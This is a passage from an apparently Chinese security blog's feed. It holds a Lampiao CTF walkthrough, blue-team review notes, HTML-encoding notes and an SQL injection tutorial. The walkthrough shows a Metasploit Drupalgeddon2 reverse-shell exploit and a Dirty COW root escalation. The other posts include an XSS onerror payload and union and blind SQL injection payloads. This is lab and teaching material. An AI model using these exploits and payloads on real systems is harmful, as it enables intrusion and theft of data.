class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; use 0</span><br><span class="line">[*] No payload configured, defaulting to php/meterpreter/reverse_tcp</span><br><span class="line">msf6 exploit(unix/webapp/drupal_drupalgeddon2) &gt; show options</span><br><span class="line"></span><br><span class="line">Module options (exploit/unix/webapp/drupal_drupalgeddon2):</span><br><span class="line"></span><br><span class="line">   Name         Current Setting  Required  Description</span><br><span class="line">   ----         ---------------  --------  -----------</span><br><span class="line">   DUMP_OUTPUT  <span class="literal">false</span>            no        Dump payload <span class="built_in">command</span> output</span><br><span class="line">   PHP_FUNC     passthru         <span class="built_in">yes</span>       PHP <span class="keyword">function</span> to execute</span><br><span class="line">   Proxies                       no        A proxy chain of format <span class="built_in">type</span>:host:port[,<span class="built_in">type</span>:host:port][...]</span><br><span class="line">   RHOSTS                        <span class="built_in">yes</span>       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Usi</span><br><span class="line">                                           ng-Metasploit</span><br><span class="line">   RPORT        80               <span class="built_in">yes</span>       The target port (TCP)</span><br><span class="line">   SSL          <span class="literal">false</span>            no        Negotiate SSL/TLS <span class="keyword">for</span> outgoing connections</span><br><span class="line">   TARGETURI    /                <span class="built_in">yes</span>       Path to Drupal install</span><br><span class="line">   VHOST                         no        HTTP server virtual host</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Payload options (php/meterpreter/reverse_tcp):</span><br><span class="line"></span><br><span class="line">   Name   Current Setting  Required  Description</span><br><span class="line">   ----   ---------------  --------  -----------</span><br><span class="line">   LHOST  10.0.0.3         <span class="built_in">yes</span>       The listen address (an interface may be specified)</span><br><span class="line">   LPORT  4444             <span class="built_in">yes</span>       The listen port</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Automatic (PHP In-Memory)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf6 exploit(unix/webapp/drupal_drupalgeddon2) &gt; <span class="built_in">set</span> rhosts http://10.0.0.102:1898/</span><br><span class="line">rhosts =&gt; http://10.0.0.102:1898/</span><br><span class="line">msf6 exploit(unix/webapp/drupal_drupalgeddon2) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 10.0.0.3:4444</span><br><span class="line">[*] Running automatic check (<span class="string">&quot;set AutoCheck false&quot;</span> to <span class="built_in">disable</span>)</span><br><span class="line">[+] The target is vulnerable.</span><br><span class="line">[*] Sending stage (39927 bytes) to 10.0.0.102</span><br><span class="line">[*] Meterpreter session 1 opened (10.0.0.3:4444 -&gt; 10.0.0.102:52034) at 2022-09-03 15:24:06 +0800</span><br><span class="line"></span><br><span class="line">meterpreter &gt; shell</span><br><span class="line">Process 5701 created.</span><br><span class="line">Channel 0 created.</span><br><span class="line">python -c <span class="string">&#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br><span class="line">www-data@lampiao:/var/www/html$ <span class="built_in">cd</span> /tmp</span><br><span class="line"><span class="built_in">cd</span> /tmp</span><br><span class="line">www-data@lampiao:/tmp$</span><br></pre></td></tr></table></figure><p>然后使用一的   dirty提权</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">www-data@lampiao:/tmp$ <span class="built_in">ls</span></span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line">40847.cpp  dcow  les.sh</span><br><span class="line">www-data@lampiao:/tmp$ ./dcow</span><br><span class="line">./dcow</span><br><span class="line">Running ...</span><br><span class="line">Received su prompt (Password: )</span><br><span class="line">Root password is:   dirtyCowFun</span><br><span class="line">Enjoy! :-)</span><br><span class="line">www-data@lampiao:/tmp$ su root</span><br><span class="line">su root</span><br><span class="line">Password: dirtyCowFun</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">root@lampiao:/tmp<span class="comment"># cd /root</span></span><br><span class="line"><span class="built_in">cd</span> /root</span><br><span class="line">root@lampiao:~<span class="comment"># ls</span></span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line">flag.txt</span><br><span class="line">root@lampiao:~<span class="comment"># cat f</span></span><br><span class="line"><span class="built_in">cat</span> flag.txt</span><br><span class="line">9740616875908d91ddcdaa8aea3af366</span><br><span class="line">root@lampiao:~<span class="comment">#</span></span><br></pre></td></tr></table></figure><h2 id="总结">总结</h2><p>一,cewl 爬取页面生成字典文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cewl http://10.0.0.102:1898/ -w passwd.txt</span><br></pre></td></tr></table></figure><p>二.目录扫描 dirb</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirb http://10.0.0.102:1898/</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;项目Lampiao&quot;&gt;项目Lampiao&lt;/h2&gt;
&lt;figure class=&quot;highlight txt&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span clas</summary>
      
    
    
    
    <category term="百项目" scheme="https://www.dansemal.cn/categories/%E7%99%BE%E9%A1%B9%E7%9B%AE/"/>
    
    
    <category term="百项目" scheme="https://www.dansemal.cn/tags/%E7%99%BE%E9%A1%B9%E7%9B%AE/"/>
    
  </entry>
  
  <entry>
    <title>003-rraven</title>
    <link href="https://www.dansemal.cn/posts/a4fe6e02/"/>
    <id>https://www.dansemal.cn/posts/a4fe6e02/</id>
    <published>2022-08-14T07:21:00.000Z</published>
    <updated>2022-08-14T06:19:20.000Z</updated>
    
    
    
    
    <category term="百项目" scheme="https://www.dansemal.cn/categories/%E7%99%BE%E9%A1%B9%E7%9B%AE/"/>
    
    
    <category term="百项目" scheme="https://www.dansemal.cn/tags/%E7%99%BE%E9%A1%B9%E7%9B%AE/"/>
    
  </entry>
  
  <entry>
    <title>护网复习</title>
    <link href="https://www.dansemal.cn/posts/22bce6ef/"/>
    <id>https://www.dansemal.cn/posts/22bce6ef/</id>
    <published>2022-03-16T10:02:25.000Z</published>
    <updated>2022-03-16T10:02:25.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="web安全漏洞">web安全漏洞</h2><h3 id="owasp-top-10x">owasp top 10x</h3><ul><li>A01- Broken Access Control(失效的访问控制)</li><li>A02-    Cryptographic Failures(加密机制失效)</li><li>A03-    Injection(注入)</li><li>A04-    Insecure Design(不安全设计)</li><li>A05-    Security Misconfiguration(安全配置错误)</li><li>A06-    Vulnerable and Outdated Components(自带缺陷和过时的组件)</li><li>A07-    Identification and Authentication Failures(身份识别和身份验证错误)</li><li>A08-    Software and Data Integrity Failures(软件和数据完整性故障)</li><li>A09-    Security Logging and Monitoring Failures(安全日志和监控故障)</li><li>A10-    Server-Side Request Forgery(服务端请求伪造)</li></ul><h2 id="安全设备日志">安全设备日志</h2><p>安全监控与日志分析</p><p>涉及防火墙,ids,waf,全流量设备,天眼,态势感知等</p><h4 id="防火墙设备">防火墙设备</h4><p>前期准备(梳理防火墙访问控制规则)</p><p>源ip处理(添加访问控制,阻断攻击源ip)</p><h4 id="IDS设备">IDS设备</h4><p>IDS主要部署模式为旁路部署，旁路接镜像流量，各厂商的IDS<br>设备功能没有大的区别，主要是对经过IDS<br>的流量进行检测、匹配规则然后产生告警事件。<br>IDS<br>操作简单，实时监控发现有高危攻击事件、异常攻击事件后导出日志及对应<br>的pacp包进行分析，如有攻击特征的就可以确认为攻击事件可以对攻击源IP<br>进行上报封禁，无攻击特征的告警事件一定不要封禁IP<br>避免误判对业务造成影响。<br>常见事件: web<br>攻击、拒绝服务攻击、远程代码执行攻击、扫描事件、<br>弱口令、暴力破解等</p><h5 id="IDS-SQL注入">IDS-SQL注入</h5><h4 id="HW常见攻击手段">HW常见攻击手段</h4><p>社会工程学<br>VPN<br>业务逻辑<br>弱口令<br>注入攻击<br>Nday<br>上传getshell<br>未授权访问<br>邮件<br>APP<br>边角系统<br>Wi-Fi<br>Weblogic<br>反序列化<br>废弃资产<br>数据库<br>Struts 2</p><h5 id="应用安全">应用安全</h5><ul><li>网页篡改-非法子页面-暗链</li><li>web漏洞(sql,xss.csrf,ssrf,上传)</li><li>中间件漏洞(weblogic反序列化,fastjson反序列化,shiro反序列化,jboss反序列化,strust2反序列化,thinkphp5反序列化,iis apache解析等)</li><li>数据库漏洞(mysql提权,redis未授权访问)</li><li>产品漏洞(泛微oa,致远oa,金蝶erp,用友erp,confluence等等)</li><li>cc攻击</li><li>服务器安全(勒索病毒,挖矿木马,口令破解,高危漏洞,</li><li>网络安全(ddos攻击,dns劫持,arp欺骗,配置错误)</li></ul><h5 id="事件识别">事件识别</h5><ul><li>特别重大事件</li><li>重大事件</li><li>较大事件</li><li>一般事件</li></ul><h4 id="识别安全事件-判断范围">识别安全事件-判断范围</h4><p>内接入区</p><p>外来接入区\</p><p>单台主机or多台主机</p><p>已被感染or处于危险中</p><h4 id="识别安全事件-用途">识别安全事件-用途</h4><p>个人办公主机</p><p>特殊权限主机</p><p>工控主机</p><p>应用服务器</p><p>数据库服务器</p><p>域控服务器</p><h4 id="识别安全事件-取证过程">识别安全事件-取证过程</h4><p>保护第一现场</p><p>​避免攻击痕迹被清除</p><p>经验法</p><p>回溯攻击法</p><p>三要素法</p><p>不轻信一面之词</p><p>​与目击者交流相关细节</p><p>​亲自核实所述,转述情况</p><h4 id="识别安全事件-取证对象">识别安全事件-取证对象</h4><p>病毒/木马文件</p><p>日志文件</p><p>​主机日志</p><p>​应用日志</p><p>​安全设备日志</p><p>攻击者残留文件</p><p>在主机上抓取的流量包</p><h4 id="应急响应常见排查思路">应急响应常见排查思路</h4><p>收集信息：收集客户信息和中毒主机信息，包括样本<br>判断类型：判断是否是安全事件，何种安全事件，勒索、挖矿、断网、DoS 等等<br>抑制范围：隔离使受害⾯不继续扩⼤<br>深入分析：日志分析、进程分析、启动项分析、样本分析方便后期溯源<br>清理处置：杀掉进程，删除文件，打补丁，删除异常系统服务，清除后门账号防止事件扩大，处理完毕后恢复生产<br>产出报告：整理并输出完整的安全事件报告</p><p>windows入侵事件应急响应</p><ul><li>网络 netstat -ano</li><li>账户 lusrmgr.msc</li><li>日志 eventvwr.msc</li></ul><p>日志路径: C:\Windows\System32\winevt\Logs、C:\windows\Minidump<br>必看日志: Security.evtx、System.evtx、Application.evtx</p><ul><li>进程 启动项 计划任务 服务</li><li>文件</li><li>内存</li></ul><p>linux入侵常见排查思路</p><ul><li>网络   netstat -anlp</li><li>进程 ps aux|grep pid</li><li>账户 uptime who w(查看某一刻用户的行为)</li><li>计划任务 crontab -l -u root</li><li>登录日志检测 /var/log   lastlog  var/log/wtmp 存储登录成功的信息、btmp 存储登录失败的信息、utmp 存储当前正在登录的信息</li><li>web日志检测</li><li>系统服务 service --status-all</li><li>文件</li><li>内存模块</li><li>rootkit检测</li></ul><p>linux 系统接入日志</p><p>多个程序会记录该日志记录到/var/log/wtmp和/var/run/utmp文件中telnet、ssh<br>等程序会更新wtmp和utmp<br>文件系统管理员可以根据该日志跟踪到谁在何时登录到系统。</p><p>/var/log/secure<br>该日志文件为Linux系统安全日志，记录用户和工作组变换情况、用户登陆认证情况</p><p>日志审计总结<br>1.<br>需要检查的系统日志文件主要包括一般信息日志、网络连接日志、文件传输日志<br>以及用户登录日志等。在检查这些日志时要特别注意时间记载分析日志产生的时<br>间是否合理;<br>2.可疑的日志记录;<br>3.非正常时间凌晨的用户登录;<br>4.笑键日志记录损坏尤其是记录用户登录登出信息的wtmp文件;<br>5.非正常IP的用户登录;<br>6.用户登录失败甚至一再尝试登录并失败的日志记录;<br>7.非正常的超级用户权限切换su指令;<br>8.非正常的控制进程启动或重启记录;<br>9.等等.</p><h4 id="Linux基线规范">Linux基线规范</h4><p>每个公司有每个公司的基线规范体系，但是答题分为下列五个方面</p><p>账号管理和授权</p><p>检查特殊账号，是否存在空密码的账户和 root 权限账户<br>禁用或删除无用账号<br>添加口令策略:/etc/login.defs修改配置文件，设置过期时间、连续认证失败次数<br>禁止 root 远程登录，限制root用户直接登录。<br>检查 su 权限。vi /etc/pam.d/su添加auth required pam_wheel.so group=test<br>服务</p><p>关闭不必要的服务<br>SSH 服务安全<br>不允许 root 账号直接登录系统，PermitRootLogin=no<br>修改 SSH 使用的协议版本为 2<br>修改允许密码错误次数（默认 6 次），MaxAuthTries=3<br>文件系统</p><p>设置 umask 值 vi /etc/profile 添加行 umask 027<br>设置登录超时 vi /etc/profile 修改配置文件，将以 TMOUT= 开头的行注释，设置为 TMOUT=180<br>日志</p><p>启用 syslogd 日志，配置日志目录权限，或者设置日志服务器</p><p>记录所有用户的登录和操作日志，通过脚本代码实现记录所有用户的登录操作日志，防止出现安全事件后无据可查</p><p><a href="https://www.alibabacloud.com/help/zh/faq-detail/49809.htm">https://www.alibabacloud.com/help/zh/faq-detail/49809.htm</a></p><p>IP 协议安全要求</p><p>远程登录取消 telnet 采用 ssh<br>设置 /etc/hosts.allow 和 deny<br>禁止 ICMP 重定向<br>禁止源路由转发<br>防 ssh 破解，iptables (对已经建立的所有链接都放行，限制每分钟连接 ssh 的次数)+ denyhost (添加 ip 拒绝访问)</p><p>##Windows 安全基线检查</p><p>主要包括五个方面：身份鉴别、访问控制、安全审计、资源控制、剩余信息保护</p><p>身份鉴别</p><p>更改缺省账户</p><p>检查Guest用户是否禁用</p><p>密码复杂性要求</p><p>密码长度最小不能小于8位</p><p>访问控制</p><p>共享账户检查</p><p>远程关机授权</p><p>本地关机</p><p>授权帐户登陆</p><p>安全审计</p><p>用户登录日志记录</p><p>系统日志完备性检查</p><p>登录超时管理</p><p>资源控制</p><p>登录超时管理</p><p>远程登录超时配置</p><p>剩余信息保护</p><p>不显示上次的用户名</p><p>关机前清除虚拟内存页面</p><p>不启用可还原的加密来存储密码</p><h4 id="常用隔离办法">常用隔离办法</h4><p>已经发生安全事件的对象<br>●采取例如断网、下线等可行措施进行隔离,避免影响其它主机<br>●通过边界控制设备,防止网络区域间相互影响<br>对于处在危险中的对象<br>●采取及时的补救加固措施<br>●相关漏洞的扫描修补与跟踪<br>●进行黑盒/白盒安全测试</p><h2 id="应急响应">应急响应</h2><p>通常指一个组织为了各种意外事件发生所做的准备,以及在事件发生后孙才去的措施.</p><h5 id="准备阶段">准备阶段</h5><p>应急团队建设</p><p>应急方案制定</p><p>渗透测试评估</p><p>安全基线检查</p><h5 id="检测阶段">检测阶段</h5><p>判断事件类型</p><p>判断事件级别</p><p>确定应急方案</p><h5 id="抑制阶段">抑制阶段</h5><p>阻断(ip,连接)</p><p>关闭(服务等)</p><p>删除()</p><h5 id="根除阶段">根除阶段</h5><p>增强(策略)</p><p>修复(漏洞)</p><p>还原(备份等等)</p><h5 id="恢复阶段">恢复阶段</h5><p>业务系统</p><p>通信系统</p><p>用户数据</p><h5 id="总结阶段">总结阶段</h5>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;web安全漏洞&quot;&gt;web安全漏洞&lt;/h2&gt;
&lt;h3 id=&quot;owasp-top-10x&quot;&gt;owasp top 10x&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;A01-	 Broken Access Control(失效的访问控制)&lt;/li&gt;
&lt;li&gt;A02-    Crypt</summary>
      
    
    
    
    <category term="hw" scheme="https://www.dansemal.cn/categories/hw/"/>
    
    
    <category term="hw" scheme="https://www.dansemal.cn/tags/hw/"/>
    
  </entry>
  
  <entry>
    <title>编码</title>
    <link href="https://www.dansemal.cn/posts/6f8a188e/"/>
    <id>https://www.dansemal.cn/posts/6f8a188e/</id>
    <published>2021-12-14T11:45:23.000Z</published>
    <updated>2021-12-09T08:45:32.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="页面编码">页面编码</h2><p>在网页设置网页编码 在<head></head>中加入设置特定html 标签</p><p>‘<meta charset="utf-8" />’ 这样页面的编码就会变成utf-8 ，如果没有设置编码就会使用默认<br>的编码，而浏览器默认编码与之不同就会出现乱码。<br>常用的有三种格式分别是 utf-8、gbk、gbk2312</p><h2 id="html编码">html编码</h2><p>HTML 编码的存在就是让他在代码中和显示中分开， 避免错误。<br>命名实体：构造是&amp;加上希腊字母，<br>字符编码：构造是&amp;#加十进制</p><p>十六进制 ASCII 码或unicode 字符编码，<br>而且浏览器解析的时候会先把 html 编码解析再进行渲染。但是有个前提就是必须要在“值”里，<br>比如属性src 里，但却不能对src 进行html 编码。不然浏览器无法正常的渲染。</p><p>十六进制<br><code>&lt;img  src=&amp;#x68;&amp;#x74;&amp;#x74;&amp;#x70;&amp;#x73;&amp;#x3a;&amp;#x2f;&amp;#x2f;&amp;#x77;&amp;#x77;&amp;#x77;&amp;#x2e ;&amp;#x62;&amp;#x61;&amp;#x69;&amp;#x64;&amp;#x75;&amp;#x2e;&amp;#x63;&amp;#x6f;&amp;#x6d;&amp;#x2f;&amp;#x69;&amp;#x6d;&amp;# x67;&amp;#x2f;&amp;#x62;&amp;#x64;&amp;#x5f;&amp;#x6c;&amp;#x6f;&amp;#x67;&amp;#x6f;&amp;#x31;&amp;#x2e;&amp;#x70;&amp;#x6e; &amp;#x67;&gt; </code></p><p>十进制</p><p><code>&lt;img  src=&amp;#104;&amp;#116;&amp;#116;&amp;#112;&amp;#115;&amp;#58;&amp;#47;&amp;#47;&amp;#119;&amp;#119;&amp;#119;&amp;#46;&amp; \#98;&amp;#97;&amp;#105;&amp;#100;&amp;#117;&amp;#46;&amp;#99;&amp;#111;&amp;#109;&amp;#47;&amp;#105;&amp;#109;&amp;#103;&amp; \#47;&amp;#98;&amp;#100;&amp;#95;&amp;#108;&amp;#111;&amp;#103;&amp;#111;&amp;#49;&amp;#46;&amp;#112;&amp;#110;&amp;#103;&gt; </code></p><p>xss<br><code> &lt;img src=&quot;Y:\md\source\_posts\x&quot; onerror=&quot;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#49;&amp;#41;&quot; /&gt;</code></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;页面编码&quot;&gt;页面编码&lt;/h2&gt;
&lt;p&gt;在网页设置网页编码 在&lt;head&gt;&lt;/head&gt;中加入设置特定html 标签&lt;/p&gt;
&lt;p&gt;‘&lt;meta charset=&quot;utf-8&quot; /&gt;’ 这样页面的编码就会变成utf-8 ，如果没有设置编码就会使用默认&lt;br&gt;
的编码</summary>
      
    
    
    
    <category term="编码" scheme="https://www.dansemal.cn/categories/%E7%BC%96%E7%A0%81/"/>
    
    
    <category term="编码" scheme="https://www.dansemal.cn/tags/%E7%BC%96%E7%A0%81/"/>
    
  </entry>
  
  <entry>
    <title>sql注入</title>
    <link href="https://www.dansemal.cn/posts/530fceb2/"/>
    <id>https://www.dansemal.cn/posts/530fceb2/</id>
    <published>2021-05-26T14:46:00.000Z</published>
    <updated>2021-06-05T06:36:14.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="access-asp-手工注入">access+asp 手工注入</h2><hr><h4 id="access-数据库">access 数据库</h4><hr><p>access 数据库与其他数据库不一样 他没有存储表的库，所以只能猜表。</p><h4 id="access-数据库结构">access 数据库结构</h4><p>表 字段 数据</p><h4 id="判断是否存在注入">判断是否存在注入</h4><ul><li><p>and 判断</p></li><li><p>and 1=1  正确页面</p></li><li><p>and 1=2 错误页面</p></li><li><p>or 判断</p></li><li><p>or 1=1 正确页面</p></li><li><p>or 1=2 错误页面</p></li></ul><h4 id="判断字段数">判断字段数</h4><p>order by 判断当前表 的字段数</p><ul><li><p>order by 10 正常</p></li><li><p>order by 11 错误</p></li></ul><p>所以有10个字段</p><h4 id="猜表">猜表</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union select 1,2,3,4,5,6,7,8,9,10 from admin</span><br></pre></td></tr></table></figure><h4 id="猜字段">猜字段</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union select 1,id,username,password,4,5,6,7,8,9,10 from admin</span><br></pre></td></tr></table></figure><hr><h3 id="逐字猜解法">逐字猜解法</h3><hr><h4 id="判断注入">判断注入</h4><ul><li><p>and 1=1</p></li><li><p>and 1=2</p></li></ul><h4 id="猜表-2">猜表</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and exists (select * from admin)</span><br></pre></td></tr></table></figure><p>页面返回正常说明表存在</p><h4 id="猜列">猜列</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and exists (select username from admin)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and exists (select password from admin)</span><br></pre></td></tr></table></figure><h4 id="猜数据长度">猜数据长度</h4><ul><li>len() 函数</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and (select top 1 len(username) from  admin)=8</span><br></pre></td></tr></table></figure><p>等于 8 就是确定数据的长度 也可以使用大于（&gt;）小于（&lt;）个人认为 等于（=）最 好确定长度</p><p>查询数据 asccii 码</p><ul><li><p>mid() 截取位置</p></li><li><p>asc() ascii 码</p></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">and (select top 1 asc(mid(username,1,1)) </span><br><span class="line">from admin)=97</span><br><span class="line">and (select top 1 asc(mid(username,2,1)) </span><br><span class="line">from admin)=100</span><br></pre></td></tr></table></figure><p>猜解完之后 把 ascii 码 转换过来 并接 就是 username 字段的的数据，其他字段也是这 样。 97 的字符为 a 100 的字符为 d 并接起来就是 ad</p><hr><h3 id="SQL-注入类型的区分详解">SQL 注入类型的区分详解</h3><hr><h4 id="首先按照常用接收方式的不同可以分为以下三种">首先按照常用接收方式的不同可以分为以下三种</h4><ul><li>GET</li></ul><p>GET 请求的参数是放在 URL 里的，GET 请求的 URL 传参有长度限制 中文需要 URL 编码</p><p>[URL 最长的长度][<a href="https://www.cnblogs.com/cuihongyu3503319/p/5892257.html">https://www.cnblogs.com/cuihongyu3503319/p/5892257.html</a>]</p><ul><li>POST</li></ul><p>POST 请求参数是放在请求 body 里的，长度没有限制</p><ul><li>COOKIE</li></ul><p>cookie 参数放在请求头信息，提交的时候 服务器会从请求头获取参数。</p><h4 id="注入数据类型的区分">注入数据类型的区分</h4><ul><li>int 整型</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from user where id=1</span><br></pre></td></tr></table></figure><ul><li>string 字符型</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from user where username=&#x27;admin&#x27;</span><br></pre></td></tr></table></figure><ul><li>like 搜索型</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from news where title like &#x27;%标题%&#x27;</span><br></pre></td></tr></table></figure><p>以上 除了第一种以外 其余在判断注入或查询语句的时候都要进行闭合，不闭合 SQL 语句不仅会出错，可能与原意不一样，会造成错误的判断</p><ul><li>字符型 注入闭合</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from user where username=&#x27;admin&#x27; and &#x27;x&#x27;=&#x27;x&#x27;</span><br></pre></td></tr></table></figure><p>’ and ‘x’='x 这个部分就是闭合的部分</p><ul><li>like 模糊型注入闭合</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from news where title like &#x27;%标题%&#x27;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from news where title like &#x27;%标题%&#x27; and &#x27;1%&#x27; = &#x27;1%&#x27;</span><br></pre></td></tr></table></figure><p>%’ and ‘1%’ = '1 这个是闭合的部分</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from news where title like &#x27;%s%&#x27; and &#x27;1%&#x27; = &#x27;1%&#x27;</span><br></pre></td></tr></table></figure><h4 id="注入方法区分">注入方法区分</h4><p>联合查询注入 union select 联合两个表</p><p>报错注入 数据库报错信息 进行注入</p><p>盲注入</p><ul><li>布尔型注入</li><li>时间型注入</li></ul><hr><h2 id="mysql-php-手工注入篇">mysql+php 手工注入篇</h2><hr><h3 id="mysql-的注释符号">mysql 的注释符号</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#</span><br><span class="line">--空格</span><br><span class="line">/*里面注释*/</span><br></pre></td></tr></table></figure><p>用于注释后后面语句 不再执行</p><h3 id="注入常用查询系统信息函数">注入常用查询系统信息函数</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">version()   MYSQL版本</span><br><span class="line"><span class="built_in">system_user</span>() 系统用户名</span><br><span class="line"><span class="keyword">user</span>()数据库用户名</span><br><span class="line"><span class="built_in">current_user</span> 当前用户名</span><br><span class="line"><span class="built_in">session_user</span>()连接数据库的用户名</span><br><span class="line">database()数据库名</span><br><span class="line">@<span class="variable">@datadir</span>数据库路径</span><br><span class="line">@<span class="variable">@basedir</span> MYSQL 安装路径</span><br><span class="line">@<span class="variable">@version_compile_os</span>操作系统版本</span><br><span class="line">load_file() MYSQL 读取本地文件的函数</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="判断是否存在注入-2">判断是否存在注入</h4><p>页面是否返回正常，或是否存在报错信息</p><ul><li><p>and 1=1 正常</p></li><li><p>and 1=2 错误</p></li><li><p>&amp;&amp; 1=1 正常</p></li><li><p>&amp;&amp; 1=2 错误</p></li><li><p>or 1=1</p></li><li><p>or 1=2</p></li></ul><h4 id="判断列数">判断列数</h4><p>与其他数据库一样 order by 进行排列获取字段数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://sql.dansemal.cn/Less-1/?id=1&#x27; order by 3 -- qwe</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/dansemal/picture_1/20210526144238.png" alt="image-20210526144229580"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://sql.dansemal.cn/Less-1/?id=1&#x27; order by 4 -- qwe</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/dansemal/picture_1/20210526144259.png" alt="image-20210526144253091"></p><p>order by 3 页面正常 order by 4 页面返回空白 或者文章没有显示出来，列数为 3 个</p><p>mysql 与 access 数据库不一样。在没有表名的前提下也可以查询数据库一些信息，如安装路径、 库名、操作系统信息</p><h4 id="联合查询-union-select">联合查询 union select</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">http://sql.dansemal.cn/Less-1/?id=&#x27; -1  union select 1,2,3 -- qwe</span><br><span class="line"></span><br><span class="line">http://sql.dansemal.cn/Less-1/?id=1&#x27;  and 1=2 union select 1,2,3 -- qwe</span><br><span class="line"></span><br><span class="line">http://sql.dansemal.cn/Less-1/?id=&#x27;  and 1=1 union select 1,2,3 -- qwe</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/dansemal/picture_1/20210526144850.png" alt="image-20210526144843542"></p><p>以上三个语句的意思都是相同的 前面获取数据为 null 将会显示后面的数字</p><h4 id="查询库名">查询库名</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://sql.dansemal.cn/Less-1/?id=&#x27; -1  union select 1,2,database() -- 